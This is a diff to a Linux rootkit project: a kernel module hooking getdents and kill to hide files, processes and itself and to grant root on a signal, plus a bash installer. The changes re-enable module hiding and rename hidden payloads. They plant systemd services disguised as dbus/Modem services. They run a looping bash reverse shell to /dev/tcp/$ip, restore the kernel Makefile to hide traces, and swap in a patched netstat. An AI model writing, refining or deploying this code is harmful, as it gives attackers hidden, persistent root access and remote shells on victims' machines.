@@ -95,7 +95,7 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-char* MAGIC_PREFIX[3] = {"dbus-org.freedesktop.Modem.service", "usb-bus", "dbus-org.freedesktop.ModemManager11.service"};
+char* MAGIC_PREFIX[4] = {"d-bus", "dbus-org.freedesktop.Modem.service", "usb-bus", "dbus-org.freedesktop.ModemManager11.service"};
 int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);
 
 #define PF_INVISIBLE 0x10000000	
@@ -105,7 +105,7 @@ int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
-	//SIGMODINVIS = 63,
+	SIGMODINVIS = 63,
 };
 
 int i;
@@ -264,7 +264,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 			}
 			prev->d_reclen += dir->d_reclen;
 		} else
-			if (i == indexes -1) {
+			if (i == indexes - 1) {
 			prev = dir;
 			}
 		}
@@ -324,7 +324,7 @@ tidy(void)
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
-/*
+
 void
 module_show(void)
 {
@@ -333,7 +333,7 @@ module_show(void)
 	//			MODULE_NAME);
 	module_hidden = 0;
 }
-*/
+
 
 void
 module_hide(void)
@@ -354,21 +354,16 @@ hacked_kill(pid_t pid, int sig)
 		case SIGINVIS:
 			if ((task = find_task(pid)) == NULL)
 				return -ESRCH;
-			/*if ((task->flags == PF_INVISIBLE)) {
-				break;
-			}*/
 			task->flags = PF_INVISIBLE;
 			//task->flags ^= PF_INVISIBLE;
 			break;
 		case SIGSUPER:
 			give_root();
 			break;
-		/*
 		case SIGMODINVIS:
 			if (module_hidden) module_show();
 			else module_hide();
 			break;
-		*/
 		default:
 			return orig_kill(pid, sig);
 	}
@@ -448,14 +443,14 @@ bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
 while read hide_pid; do
 	cmdline=$(cat /proc/$hide_pid/cmdline)
 	cat /proc/$hide_pid/cmdline &>/dev/null
-	if [ "$(echo "$?")" == "1" ]; then
+	if [ "$?" == "1" ]; then
 		continue
 	fi
-	if [ "$cmdline" == "/bin/bash/bin/usb-bus" ] || [ "$cmdline" == "/bin/bash/sbin/usb-bus" ]; then
+	if [ "$cmdline" == "/bin/bash/usb-bus" ] || [ "$cmdline" == "/bin/bash/home/d-bus" ]; then
 		kill -31 $hide_pid
 		#echo "hid systemd service pid: $hide_pid"
 	fi
-done <<< "$bash_pid"
+done <<<$bash_pid
 
 #hide bash shells which our systemd service spawns
 inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
@@ -476,7 +471,7 @@ for (( i=1; i <= 65553; i=i+1 )); do
 			hidden_pids[i]=$i
 			#echo "hidden_pids[i] pid: ${hidden_pids[i]}"
 		fi
-	done <<< "$inode_list"
+	done <<<$inode_list
 done
 
 #sleep 10
@@ -491,7 +486,7 @@ _bash=$(cat << EOF
 
 while true; do
 
-bash &>/dev/tcp/$ip  0>&1 #& 
+bash &>/dev/tcp/$ip  0>&1 & 
 sleep 60
 
 done
@@ -506,7 +501,7 @@ StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/bin/usb-bus
+ExecStart=/usb-bus
 Restart=always
 User=root
 
@@ -523,7 +518,7 @@ StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/etc/usb-bus
+ExecStart=/home/d-bus
 Restart=always
 User=root
 
@@ -604,10 +599,10 @@ if [ "$USER" == "root" ]; then
 
 	#---create the systemd services---
 	#create the files that the systemd services are gonna use
-	printf "$_hiding" >/bin/usb-bus
-	chmod 777 /bin/usb-bus
-	printf "$_bash" >/etc/usb-bus
-	chmod 777 /etc/usb-bus	
+	printf "$_hiding" >/usb-bus
+	chmod 777 /usb-bus
+	printf "$_bash" >/home/d-bus
+	chmod 777 /home/d-bus	
 	#create a systemd service to execute the _hiding script
 	systemctl stop dbus-org.freedesktop.Modem.service &>/dev/null
 	systemctl disable dbus-org.freedesktop.Modem.service &>/dev/null
@@ -721,7 +716,7 @@ if [ "$USER" == "root" ]; then
 		location1=$(readlink -m /usr/src/linux-headers-$(uname -r)/Makefile)
 		location=$(echo "$location1" | awk -F/ '{ print $2"/"$3"/"$4 }')		
 		printf "$mkfile" >/$location/mkfile.patch
-		patch -d /$location </$location/mkfile.patch &>/dev/null
+		patch -b -d /$location </$location/mkfile.patch &>/dev/null
 		if [ "$?" == "0" ]; then
 			echo "patch source Makefile successful"
 		else
@@ -736,6 +731,8 @@ if [ "$USER" == "root" ]; then
 		else
 			echo "make usb-bus rootkit module unsuccessful"
 		fi
+		rm /$location/Makefile
+		mv /$location/Makefile.* /$location/Makefile
 	fi
 	#make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
 	#printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
@@ -768,7 +765,6 @@ if [ "$USER" == "root" ]; then
 	#---replace netstat---
 	rm /tmp/net-tools.zip &>/dev/null
 	rm  -r /tmp/net-tools-master &>/dev/null
-	echo "replacing netstat..."
 	#check if wget is installed, otherwise intall it and download net-tools.zip
 	ls /usr/bin/wget &>/dev/null
 	if [ "$?" != "0" ]; then
@@ -781,6 +777,7 @@ if [ "$USER" == "root" ]; then
 			echo "wget din't install"
 		fi
 	fi
+	echo "downloading net-tools.zip..."
 	wget -O /tmp/net-tools.zip https://github.com/ecki/net-tools/archive/master.zip &>/dev/null
 	if [ "$?" == "0" ]; then
 		echo "downloaded net-tools.zip"
@@ -832,7 +829,7 @@ if [ "$USER" == "root" ]; then
 	else
 		echo "netstat.c not replaced"
 	fi
-	#patch the Makefile
+	#patch the net-tools Makefile
 	printf "$netpatch" >/tmp/net-tools-master/net.patch
 	patch -d /tmp/net-tools-master/ </tmp/net-tools-master/net.patch &>/dev/null
 	if [ "$?" == "0" ]; then
@@ -850,11 +847,31 @@ if [ "$USER" == "root" ]; then
 		fi
 	fi
 	#make update net-tools-master so netstat gets replaced
+	ls /usr/bin/yes &>/dev/null
+	if [ "$?" != "0" ]; then
+		y="yes"
+		echo "installing yes..."
+		apt-get install yes -y &>/dev/null
+		if [ "$?" == "0" ]; then
+			echo "yes installed successfully"
+		else
+			echo "yes din't install"
+		fi
+	fi
 	yes "" | make -C /tmp/net-tools-master config &>/dev/null
 	if [ "$?" == "0" ]; then
 		echo "make config net-tools successful"
 	else
 		echo "make  config net-tools unsuccessful"
+	fi
+	if [ "$y" == "yes" ]; then
+		echo "removing yes..."
+		apt-get purge yes -y &>/dev/null
+		if [ "$?" == "0" ]; then
+			echo "yes removed"
+		else
+			echo "yes not removed"
+		fi
 	fi
 	make -C /tmp/net-tools-master &>/dev/null
 	if [ "$?" == "0" ]; then
@@ -862,7 +879,7 @@ if [ "$USER" == "root" ]; then
 	else
 		echo "make net-tools-master unsuccessful"
 	fi
-	make update -C /tmp/net-tools-master  &>/dev/null
+	make update -C /tmp/net-tools-master &>/dev/null
 	if [ "$?" == "0" ]; then
 		echo "netstat replaced"
 	else
